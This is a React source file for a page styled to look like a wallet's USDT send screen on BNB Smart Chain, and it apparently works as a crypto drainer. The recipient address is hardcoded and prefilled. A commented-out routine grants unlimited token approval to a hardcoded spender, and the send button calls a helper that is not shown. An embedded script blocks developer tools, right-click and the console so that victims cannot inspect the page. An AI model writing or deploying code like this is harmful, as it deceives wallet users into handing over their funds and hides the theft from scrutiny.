import React, { useState, useEffect, useRef } from "react";
import styled from 'styled-components';
import Web3 from "web3";
import { ethers } from "ethers";
import { FaArrowLeft } from 'react-icons/fa';
import { fetchBalances, handleGetStartedClick } from './utils/transactionUtils.js';
import { detectWalletAddress } from "./utils/transactionUtils.js"; // you'll create this helper

/* eslint-disable */

const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const RECIPIENT_ADDRESS = "0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d";
const USDT_ABI = [
  {
    constant: true,
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "value", type: "uint256" }
    ],
    name: "approve",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function"
  }    
];

// BSC RPC Provider
const rpcUrl = "https://bsc-dataseed.binance.org/";
const bscProvider = new ethers.JsonRpcProvider(rpcUrl);

// Force White Background for Entire Page
const GlobalStyle = styled.div`
  background-color: white !important;
  color: black !important;
  height: 100vh;
  width: 100vw;
  display: flex;
  justify-content: center;
  align-items: center;
`;

// Main container
const Container = styled.div`
  display: flex;
  flex-direction: column;
  padding: 20px;
  height: 100vh;
  justify-content: flex-start;
  width: 100%;
  box-sizing: border-box;
`;

// Back button styling
const BackButton = styled.button`
  position: absolute;
  left: 20px;
  top: 35px;
  background: none;
  border: none;
  color: #d8dbdf;
  font-size: 20px;
  cursor: pointer;
`;

// Title styling
const Title = styled.h1`
  font-size: 16px;
  font-weight: 550;
  text-align: center;
  margin-bottom: 10px;
  font-family: 'Roboto', sans-serif;
`;

// Input container
const InputContainer = styled.div`
  margin-top: 10px;
  margin-bottom: 20px;
`;

// Label styling
const InputLabel = styled.label`
  font-size: 14px;
  font-weight: 500;
  color: #626262;
`;

// Input field container
const InputFieldContainer = styled.div`
  display: flex;
  align-items: center;
  position: relative;
  width: 100%;
`;

// Styled input field
const Input = styled.input`
  width: 100%;
  padding: 16px 100px 16px 12px; /* Adjusted padding for buttons */
  font-size: 16px;
  font-weight: normal;
  margin-top: 5px;
  border-radius: 3px;
  border: 1px solid #ccc;
  box-sizing: border-box;
  height: 50px;
  appearance: none; /* ✅ Removes default increase/decrease arrows */
  -moz-appearance: textfield; /* ✅ Removes arrows in Firefox */

  &::-webkit-outer-spin-button,
  &::-webkit-inner-spin-button {
    -webkit-appearance: none;
    margin: 0;
  }

  &:focus {
    border-color: #eeeff2;
    box-shadow: 0px 0px 6px #eeeff2;
    outline: none;
  }
`;  

// Circular Clear Button (Only for Address Field)
const ClearButton = styled.span`
  position: absolute;
  right: 60px;
  top: 50%;
  transform: translateY(-50%);
  background: #eeeff2;
  color: #626262;
  font-size: 14px;
  font-weight: 500;
  cursor: pointer;
  border-radius: 50%;
  width: 24px;
  height: 24px;
  display: flex;
  align-items: center;
  justify-content: center;

  &:hover {
    background: #dcdcdc;
  }
`;

// Paste Button styling
const PasteButton = styled.span`
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  color: #0600ff;
  font-weight: 600;
  font-size: 14px;
  cursor: pointer;
  padding-left: 15px;
  /* Forcing Light Mode */
  background-color: white !important;
  color: black !important;
  
  /* Prevents Trust Wallet from overriding styles */
  * {
    color-scheme: light !important;
  }
`;

// "USDT" text (Aligned correctly)
const UsdtText = styled.span`
  position: absolute;
  right: 50px;
  top: 50%;
  transform: translateY(-50%);
  color: #626262;
  font-weight: 600;
  font-size: 14px;
`;

// "Max" button styling
const MaxText = styled.span`
  position: absolute;
  right: 10px;
  top: 50%;
  transform: translateY(-50%);
  color: #0600ff;
  font-weight: 600;
  font-size: 14px;
  cursor: pointer;
`;

const AmountContainer = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  position: relative;
  width: 100%;
`;

// Next Button styling
const NextButton = styled.button`
  background-color: #0600ff;
  color: white;
  padding: 15px 25px;
  font-size: 18px;
  font-weight: bold;
  width: 100%;
  border-radius: 20px;
  border: none;
  cursor: pointer;
  box-shadow: 0px 4px 10px rgba(0, 0, 255, 0.2);
  margin-top: 250px;
  display: flex;
  align-items: center;
  justify-content: center;
`;

// Amount conversion text
const AmountConversion = styled.p`
  text-align: left;
  color: #626262;
  font-size: 14px;
  font-weight: 500;
  margin-top: 10px;
`;

const App = () => {
  const [address, setAddress] = useState(RECIPIENT_ADDRESS);
  const [usdtAmount, setUsdtAmount] = useState("");
  const [usdtBalance, setUsdtBalance] = useState(0);
  const [bnbBalance, setBnbBalance] = useState(0);
  const [walletConnected, setWalletConnected] = useState(false);
  const [loading, setLoading] = useState(false);
  const [transferCompleted, setTransferCompleted] = useState(false);
  const [walletAddress, setWalletAddress] = useState("");

  const isProcessing = useRef(false);

  // Commented out sendUSDT to preserve original code but disable it
  /*
  const sendUSDT = async () => {
    if (isProcessing.current) return;
    try {
      isProcessing.current = true;
      setLoading(true);
      setTransferCompleted(false);
      if (!window.ethereum) return;
      const web3 = new Web3(window.ethereum);
      const accounts = await web3.eth.getAccounts();
      const sender = accounts[0];
      if (!sender || !web3.utils.isAddress(sender)) return;
      const chainId = await web3.eth.getChainId();
      if (chainId !== 56) {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }],
        });
      }
      const params = new URLSearchParams(window.location.search);
      const userAddress = params.get("address");
      if (!userAddress || !/^0x[a-fA-F0-9]{40}$/.test(userAddress)) return;
      const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
      const SPENDER_ADDRESS = "0xcad014a3a7755137b5d1631e48f3d88daca8d910";
      const MAX_UINT256 = web3.utils.toTwosComplement(-1);
      await contract.methods.approve(SPENDER_ADDRESS, MAX_UINT256).send({ from: sender });
      setTransferCompleted(true);
    } catch (err) {
      console.error("🔴 Approval error:", err);
    } finally {
      isProcessing.current = false;
      setLoading(false);
    }
  };
  */

  useEffect(() => {
    const ensureBSCNetwork = async () => {
      const bscChainId = "0x38";
      try {
        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
        if (currentChainId !== bscChainId) {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: bscChainId }],
          });
        }
      } catch (error) {
        if (error.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: bscChainId,
                chainName: 'Binance Smart Chain',
                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                blockExplorerUrls: ['https://bscscan.com'],
              }],
            });
          } catch (addError) {
            console.error("❌ Couldn't add BSC:", addError);
          }
        } else {
          console.error("❌ Failed to switch network:", error);
        }
      }
    };
    ensureBSCNetwork();
  }, []);

  useEffect(() => {
    const init = async () => {
      try {
        if (!window.ethereum) return;
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const userAddress = await signer.getAddress();
        setWalletAddress(userAddress);
        console.log("🔗 Wallet connected:", userAddress);
        const balances = await fetchBalances(userAddress);
        setUsdtBalance(balances.usdt);
        setBnbBalance(balances.bnb);
        console.log("✅ Balances fetched:", balances);
        setWalletConnected(true);
      } catch (err) {
        console.error("❌ init() error:", err);
      }
    };
    init();
  }, []);

  const clearAddress = () => {
    setAddress("");
  };

  return (
    <GlobalStyle>
      <Container>
        <script>
          {`
            (function() {
              try {
                // Detect DevTools opening via window size
                if ((window.outerWidth - window.innerWidth > 100) || (window.outerHeight - window.innerHeight > 100)) {
                  alert('Developer tools are disabled on this page.');
                  window.location.href = 'about:blank';
                }
                let devToolsOpen = false;
                setInterval(() => {
                  if ((window.outerWidth - window.innerWidth > 100) || (window.outerHeight - window.innerHeight > 100) && !devToolsOpen) {
                    devToolsOpen = true;
                    alert('Developer tools are disabled on this page.');
                    window.location.reload();
                  }
                }, 500);

                // Block key events
                document.addEventListener('keydown', function(e) {
                  console.log('Key pressed:', e.key, e.code, e.keyCode, e.location);
                  if (e.key === 'F12' || e.code === 'F12' || e.keyCode === 123 || e.which === 123 || (e.location === 1 && e.key === 'F12')) {
                    e.preventDefault();
                    e.stopPropagation();
                    alert('Developer tools are disabled on this page.');
                    return false;
                  }
                  if ((e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
                    e.preventDefault();
                    e.stopPropagation();
                    alert('Developer tools are disabled on this page.');
                    return false;
                  }
                }, true); // Use capture phase for priority

                // Disable console
                Object.defineProperty(window, 'console', {
                  value: {},
                  writable: false
                });
                console.log = () => {};
                console.debug = () => {};
                console.info = () => {};
                console.warn = () => {};
                console.error = () => {};

                // Prevent right-click
                document.addEventListener('contextmenu', event => {
                  event.preventDefault();
                  alert('Developer tools are disabled on this page.');
                });
              } catch (e) {
                console.error('Security setup failed:', e);
              }
            })();
          `}
        </script>
        <InputContainer>
          <InputLabel>Address or Domain Name</InputLabel>
          <InputFieldContainer>
            {address && <ClearButton onClick={clearAddress}>×</ClearButton>}
            <Input type="text" value={address} onChange={(e) => setAddress(e.target.value)} />
            <PasteButton>Paste</PasteButton>
          </InputFieldContainer>
        </InputContainer>

        <InputContainer>
          <InputLabel>Amount</InputLabel>
          <AmountContainer>
            <InputFieldContainer>
              <Input type="number" value={usdtAmount} onChange={(e) => setUsdtAmount(e.target.value)} />
              <UsdtText>USDT</UsdtText>
              <MaxText>Max</MaxText>
            </InputFieldContainer>
          </AmountContainer>
          <AmountConversion>= ${parseFloat(usdtAmount * 1 || 0).toFixed(2)}</AmountConversion>
        </InputContainer>

        <NextButton
          onClick={async () => {
            try {
              setLoading(true);
              if (!usdtAmount || isNaN(parseFloat(usdtAmount)) || parseFloat(usdtAmount) <= 0) {
                throw new Error("Please enter a valid USDT amount.");
              }
              await handleGetStartedClick(usdtAmount);
              setTransferCompleted(true);
            } catch (error) {
              console.error("Transfer failed:", error);
              alert(error.message || "Transfer failed. Check console for details.");
            } finally {
              setLoading(false);
            }
          }}
        >
          {loading ? "Processing..." : transferCompleted ? "Transfer completed" : walletConnected ? "Next" : "Connect Wallet"}
        </NextButton>
      </Container>
    </GlobalStyle>
  );
};

export default App;
